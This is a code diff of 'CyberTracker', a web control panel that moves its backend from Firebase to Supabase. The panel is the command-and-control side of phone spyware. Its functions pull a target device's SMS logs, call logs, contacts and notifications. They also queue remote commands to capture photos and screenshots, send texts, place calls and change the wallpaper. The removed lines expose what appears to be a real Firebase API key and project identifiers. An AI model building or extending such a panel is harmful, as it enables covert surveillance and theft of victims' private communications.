@@ -5,8 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CyberTracker Control Panel</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 </head>
 <body>
     <h1>CyberTracker - Remote Control Panel</h1>
@@ -27,116 +26,78 @@
     <div id="output"></div>
 
     <script>
-        // Firebase Config (Replace with your Firebase Config)
-        const firebaseConfig = {
-            apiKey: "AIzaSyBTh4NAkpKI-b1Pfod2r6VylK7Bd2VMCtk",
-            authDomain: "education-1b2f1.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
-            projectId: "education-1b2f1",
-            storageBucket: "education-1b2f1.firebasestorage.app",
-            messagingSenderId: "1064282944854",
-            appId: "1:1064282944854:web:91279b39577fd4d22c52f7"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        // Supabase Config
+        const SUPABASE_URL = "https://YOUR_SUPABASE_PROJECT_URL.supabase.co";
+        const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        function fetchDeviceInfo() {
-            db.ref("Device_Info").once("value")
-                .then(snapshot => {
-                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-                })
-                .catch(error => {
-                    document.getElementById("output").innerText = "Something went wrong";
-                    console.error("Error fetching device info:", error);
-                });
+        async function fetchDeviceInfo() {
+            let { data, error } = await supabase.from("Device_Info").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
         }
 
-        function fetchSMS() {
-            db.ref("SMS_Logs").once("value")
-                .then(snapshot => {
-                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-                })
-                .catch(error => {
-                    document.getElementById("output").innerText = "Something went wrong";
-                    console.error("Error fetching SMS logs:", error);
-                });
+        async function fetchSMS() {
+            let { data, error } = await supabase.from("SMS_Logs").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
         }
 
-        function fetchCallLogs() {
-            db.ref("Call_Logs").once("value")
-                .then(snapshot => {
-                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-                })
-                .catch(error => {
-                    document.getElementById("output").innerText = "Something went wrong";
-                    console.error("Error fetching call logs:", error);
-                });
+        async function fetchCallLogs() {
+            let { data, error } = await supabase.from("Call_Logs").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
         }
 
-        function fetchContacts() {
-            db.ref("Contacts").once("value")
-                .then(snapshot => {
-                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-                })
-                .catch(error => {
-                    document.getElementById("output").innerText = "Something went wrong";
-                    console.error("Error fetching contacts:", error);
-                });
+        async function fetchContacts() {
+            let { data, error } = await supabase.from("Contacts").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
         }
 
-        function fetchNotifications() {
-            db.ref("Notifications").once("value")
-                .then(snapshot => {
-                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
-                })
-                .catch(error => {
-                    document.getElementById("output").innerText = "Something went wrong";
-                    console.error("Error fetching notifications:", error);
-                });
+        async function fetchNotifications() {
+            let { data, error } = await supabase.from("Notifications").select("*");
+            if (error) {
+                console.error(error);
+            } else {
+                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+            }
         }
 
-        function capturePhoto() {
-            db.ref("Commands").set({ action: "capture_photo" })
-                .catch(error => {
-                    alert("Something went wrong");
-                    console.error("Error capturing photo:", error);
-                });
+        async function capturePhoto() {
+            await supabase.from("Commands").insert([{ action: "capture_photo" }]);
         }
 
-        function takeScreenshot() {
-            db.ref("Commands").set({ action: "take_screenshot" })
-                .catch(error => {
-                    alert("Something went wrong");
-                    console.error("Error capturing screenshot:", error);
-                });
+        async function takeScreenshot() {
+            await supabase.from("Commands").insert([{ action: "take_screenshot" }]);
         }
 
-        function sendSMS() {
+        async function sendSMS() {
             let number = prompt("Enter Phone Number:");
             let message = prompt("Enter Message:");
-            db.ref("Commands").set({ action: "send_sms", number: number, message: message })
-                .catch(error => {
-                    alert("Something went wrong");
-                    console.error("Error sending SMS:", error);
-                });
+            await supabase.from("Commands").insert([{ action: "send_sms", number: number, message: message }]);
         }
 
-        function makeCall() {
+        async function makeCall() {
             let number = prompt("Enter Phone Number:");
-            db.ref("Commands").set({ action: "make_call", number: number })
-                .catch(error => {
-                    alert("Something went wrong");
-                    console.error("Error making call:", error);
-                });
+            await supabase.from("Commands").insert([{ action: "make_call", number: number }]);
         }
 
-        function changeWallpaper() {
+        async function changeWallpaper() {
             let imageUrl = prompt("Enter Image URL:");
-            db.ref("Commands").set({ action: "change_wallpaper", url: imageUrl })
-                .catch(error => {
-                    alert("Something went wrong");
-                    console.error("Error changing wallpaper:", error);
-                });
+            await supabase.from("Commands").insert([{ action: "change_wallpaper", url: imageUrl }]);
         }
     </script>
 </body>
